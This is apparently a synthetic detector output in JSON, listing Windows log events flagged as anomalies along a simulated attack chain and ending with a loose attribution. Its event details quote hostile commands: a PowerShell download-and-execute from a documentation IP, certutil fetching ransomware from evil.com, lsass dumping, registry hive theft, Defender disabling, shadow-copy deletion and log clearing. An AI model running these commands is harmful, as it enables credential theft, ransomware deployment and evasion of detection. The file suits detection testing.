@@ -1,0 +1,865 @@
+{
+  "summary": {
+    "total_events": 239,
+    "anomalies_detected": 138,
+    "critical_anomalies": 1,
+    "attack_phases": [
+      "execution",
+      "discovery",
+      "privilege_escalation",
+      "defense_evasion",
+      "persistence",
+      "exfiltration",
+      "impact"
+    ]
+  },
+  "anomalies": [
+    {
+      "timestamp": "2024-09-14T22:45:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-14T23:10:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-15T00:18:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-15T00:35:12",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-09-15T01:28:45",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-15T01:45:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: acrobat.exe"
+    },
+    {
+      "timestamp": "2024-09-15T02:00:00",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'root' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:02:15",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'sysadmin' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:05:42",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'administrator' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:08:11",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'admin123' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:10:33",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'backup' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:12:47",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'test' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:14:55",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'admin' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:15:32",
+      "type": "Failed Login Attempts",
+      "severity": "HIGH",
+      "details": "Failed login attempt for user 'administrator' from 192.168.100.50   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:17:21",
+      "type": "Privilege Escalation",
+      "severity": "HIGH",
+      "details": "Special privileges assigned to user 'jsmith'   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:22:30",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c whoami /all   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:24:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c net user jsmith /domain   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:26:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c net localgroup administrators   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:28:47",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c ipconfig /all   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:31:12",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c net view /domain   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:47:33",
+      "type": "Service Manipulation",
+      "severity": "MEDIUM",
+      "details": "Service created: WindowsUpdateService with binary path 'C:\\\\Windows\\\\Temp\\\\svchost32.exe'   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:50:21",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "New process created: reg.exe add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:50:21",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: reg.exe add HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:52:44",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "Registry value set: HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowsUpdate = C:\\\\Windows\\\\Temp\\\\updater.exe   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T02:55:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-15T03:15:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-15T03:23:45",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\\\Temp\\\\stage1.ps1   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T03:25:18",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T03:27:42",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "Network connection detected: powershell.exe -> 203.0.113.50:443   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T03:35:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-15T03:48:12",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-15T04:12:11",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: notepad.exe"
+    },
+    {
+      "timestamp": "2024-09-15T04:45:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: code.exe"
+    },
+    {
+      "timestamp": "2024-09-15T05:09:41",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-15T05:22:18",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-15T06:00:00",
+      "type": "Service Manipulation",
+      "severity": "MEDIUM",
+      "details": "Service created: WindowsUpdateService"
+    },
+    {
+      "timestamp": "2024-09-15T06:32:11",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-15T06:48:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-15T07:00:01",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: python.exe backup.py"
+    },
+    {
+      "timestamp": "2024-09-15T07:48:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-15T08:00:12",
+      "type": "Privilege Escalation",
+      "severity": "HIGH",
+      "details": "Special privileges assigned to new logon (admin rights granted)   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-15T08:05:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-09-15T08:55:28",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-15T09:12:05",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-16T08:18:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-16T08:35:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-16T09:08:45",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-16T09:25:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: code.exe"
+    },
+    {
+      "timestamp": "2024-09-16T10:15:26",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-16T10:22:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c nltest /domain_trusts   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T10:25:43",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c net group \"Domain Admins\" /domain   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T10:28:17",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c net accounts /domain   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T10:31:52",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c query user   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T10:32:04",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-16T10:48:42",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: acrobat.exe"
+    },
+    {
+      "timestamp": "2024-09-16T11:38:34",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-16T11:55:12",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-16T12:11:49",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-16T13:01:42",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-09-16T13:18:20",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-16T14:08:13",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-16T14:25:10",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "Process accessed: lsass.exe by powershell.exe   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:30:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: mimikatz.exe    # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:32:47",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: procdump.exe -ma lsass.exe lsass.dmp   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:35:28",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "Attempt to access SAM registry hive detected   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:37:55",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "New process created: reg.exe save HKLM\\\\SAM C:\\\\Temp\\\\sam.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:37:55",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: reg.exe save HKLM\\\\SAM C:\\\\Temp\\\\sam.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:40:12",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "New process created: reg.exe save HKLM\\\\SYSTEM C:\\\\Temp\\\\system.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:40:12",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: reg.exe save HKLM\\\\SYSTEM C:\\\\Temp\\\\system.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:41:51",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: code.exe"
+    },
+    {
+      "timestamp": "2024-09-16T14:42:41",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "New process created: reg.exe save HKLM\\\\SECURITY C:\\\\Temp\\\\security.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T14:42:41",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: reg.exe save HKLM\\\\SECURITY C:\\\\Temp\\\\security.save   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-16T15:31:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-16T15:48:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-16T16:02:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-16T16:38:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-16T16:54:53",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-16T17:44:46",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-09-17T08:27:05",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-17T08:43:48",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-17T09:33:57",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-17T09:50:40",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-17T02:20:18",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: psexec.exe \\\\\\\\SERVER2 -u administrator -p [PASSWORD]   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-17T10:40:49",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-17T10:57:32",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: acrobat.exe"
+    },
+    {
+      "timestamp": "2024-09-17T03:47:41",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: wmic.exe /node:SERVER3 process call create \"cmd.exe /c ...\"   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-17T11:47:41",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-17T12:04:24",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-09-17T05:01:55",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-17T08:22:44",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: net.exe use \\\\\\\\192.168.1.30\\\\C$ /user:administrator [PASSWORD]   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-17T08:25:11",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: xcopy.exe /s /e /h \\\\\\\\192.168.1.30\\\\C$\\\\Data C:\\\\Staging\\\\   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-18T08:32:27",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-09-18T08:49:10",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-09-18T09:39:19",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-09-18T09:56:02",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-09-18T10:33:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powershell.exe Get-ChildItem -Recurse -Include *.pdf,*.docx,*.xlsx   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-18T10:39:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: 7z.exe a -tzip -pEncrypted123 C:\\\\Staging\\\\archive.7z C:\\\\Staging\\\\*   # anomaly"
+    },
+    {
+      "timestamp": "2024-09-18T10:46:11",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-09-18T22:10:45",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: wmic.exe process call create   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-10T08:38:58",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-10-10T15:28:41",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c dir /s /b C:\\\\Users\\\\*.pdf > C:\\\\Temp\\\\files.txt   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-10T15:31:19",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c type C:\\\\Users\\\\john\\\\Documents\\\\passwords.txt   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T08:35:05",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-10-25T03:55:10",
+      "type": "Log Clearing",
+      "severity": "HIGH",
+      "details": "Audit log was cleared by user 'tempuser'   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T03:57:44",
+      "type": "Log Clearing",
+      "severity": "HIGH",
+      "details": "System event log cleared   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:00:21",
+      "type": "Log Clearing",
+      "severity": "HIGH",
+      "details": "Application event log cleared   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T08:51:48",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: powerpnt.exe"
+    },
+    {
+      "timestamp": "2024-10-25T04:12:33",
+      "type": "Defender Tampering",
+      "severity": "LOW",
+      "details": "Defender Windows Defender real-time protection disabled   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:15:20",
+      "type": "Defender Tampering",
+      "severity": "LOW",
+      "details": "Windows Defender service disabled   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:16:08",
+      "type": "Defender Tampering",
+      "severity": "LOW",
+      "details": "Windows Defender Antivirus Service entered stopped state   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:16:33",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: vssadmin.exe delete shadows /all /quiet   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:16:33",
+      "type": "Shadow Copy Deletion",
+      "severity": "CRITICAL",
+      "details": "New process created: vssadmin.exe delete shadows /all /quiet   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:17:22",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "Registry value modified: DisableAntiSpyware set to 1   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:18:05",
+      "type": "Registry Modification",
+      "severity": "MEDIUM",
+      "details": "Registry value modified: DisableBehaviorMonitoring set to 1   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:18:45",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: calc.exe"
+    },
+    {
+      "timestamp": "2024-10-25T04:19:31",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: wevtutil.exe cl Security   # anomaly"
+    },
+    {
+      "timestamp": "2024-10-25T04:20:14",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: wevtutil.exe cl System   # anomaly"
+    },
+    {
+      "timestamp": "2024-11-15T08:37:16",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-11-15T08:45:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "Network connection: cmd.exe -> 203.0.113.75:443   # anomaly"
+    },
+    {
+      "timestamp": "2024-11-15T08:47:51",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "Network connection: powershell.exe -> 198.51.100.7:8443   # anomaly"
+    },
+    {
+      "timestamp": "2024-11-15T08:53:59",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-11-22T14:32:25",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-11-22T14:49:08",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-12-05T22:27:34",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-12-20T05:30:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: certutil.exe -urlcache -split -f http://evil.com/ransomware.exe C:\\\\Temp\\\\ransomware.exe  # anomaly"
+    },
+    {
+      "timestamp": "2024-12-20T05:34:05",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: icacls.exe C:\\\\Temp\\\\ransomware.exe /grant Everyone:F   # anomaly"
+    },
+    {
+      "timestamp": "2024-12-20T05:35:22",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: ransomware.exe --encrypt-all --extension .locked --note ransom.txt   # anomaly"
+    },
+    {
+      "timestamp": "2024-12-20T05:38:52",
+      "type": "Defender Tampering",
+      "severity": "LOW",
+      "details": "Defender Behavior:Win32/Suspicious.Ransomware detected   # anomaly"
+    },
+    {
+      "timestamp": "2024-12-20T05:42:15",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: cmd.exe /c del /f /q C:\\\\Windows\\\\Temp\\\\*.exe   # anomaly"
+    },
+    {
+      "timestamp": "2024-12-20T07:00:01",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: explorer.exe"
+    },
+    {
+      "timestamp": "2024-12-20T08:22:05",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: outlook.exe"
+    },
+    {
+      "timestamp": "2024-12-20T08:38:48",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: chrome.exe"
+    },
+    {
+      "timestamp": "2024-12-20T09:12:14",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: teams.exe"
+    },
+    {
+      "timestamp": "2024-12-20T09:28:57",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: winword.exe"
+    },
+    {
+      "timestamp": "2024-12-20T09:40:01",
+      "type": "Service Manipulation",
+      "severity": "MEDIUM",
+      "details": "New process created: mstsc.exe /v:192.168.1.15"
+    },
+    {
+      "timestamp": "2024-12-20T09:40:01",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: mstsc.exe /v:192.168.1.15"
+    },
+    {
+      "timestamp": "2024-12-20T10:19:06",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: excel.exe"
+    },
+    {
+      "timestamp": "2024-12-20T10:35:49",
+      "type": "Process Creation",
+      "severity": "LOW",
+      "details": "New process created: acrobat.exe"
+    }
+  ],
+  "attribution": {
+    "techniques_used": [
+      "execution",
+      "discovery",
+      "privilege_escalation",
+      "defense_evasion",
+      "persistence",
+      "exfiltration",
+      "impact"
+    ],
+    "timeline_duration": "96 days, 12:22:17",
+    "primary_targets": [],
+    "sophistication_level": "MEDIUM - Organized Cybercrime",
+    "possible_attribution": [
+      "APT29 (Cozy Bear)",
+      "Lazarus Group",
+      "REvil/Sodinokibi"
+    ]
+  }
+}
